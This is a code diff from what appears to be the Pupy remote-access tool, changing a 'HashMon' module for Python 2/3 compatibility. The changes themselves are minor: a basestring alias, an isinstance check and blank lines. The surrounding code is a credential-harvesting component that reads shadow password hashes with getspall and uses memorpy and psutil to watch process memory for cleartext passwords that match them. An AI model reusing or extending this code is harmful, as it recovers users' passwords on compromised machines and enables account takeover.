@@ -4,14 +4,21 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
+
 import memorpy
+
 from spwd import getspall
 
+import sys
 import time
 import re
 import psutil
 import pupy
 import crypt
+
+if sys.version_info.major > 2:
+    basestring = str
+
 
 def start(names, hashes=[], poll=20, minpw=8, maxpw=16, maxdups=131072, policy=True):
     if pupy.manager.active(HashMon):
@@ -28,16 +35,19 @@ def start(names, hashes=[], poll=20, minpw=8, maxpw=16, maxdups=131072, policy=T
 
     return True
 
+
 def dump():
     mon = pupy.manager.get(HashMon)
     if mon:
         return mon.results
+
 
 def stop():
     mon = pupy.manager.get(HashMon)
     if mon:
         pupy.manager.stop(HashMon)
         return mon.results
+
 
 class HashMon(pupy.Task):
     def __init__(self, manager, names=[], hashes=[], poll=60, minpw=8, maxpw=16, maxdups=131072, policy=True):
@@ -56,7 +66,7 @@ class HashMon(pupy.Task):
         self.last_pids = frozenset()
 
         if self.policy is not None:
-            if type(self.policy) in (str, unicode):
+            if isinstance(self.policy, basestring):
                 self.policy = re.compile(self.policy)
             elif self.policy is True:
                 # Default - 1 digit, alpha, symbol, 8-16 symbols
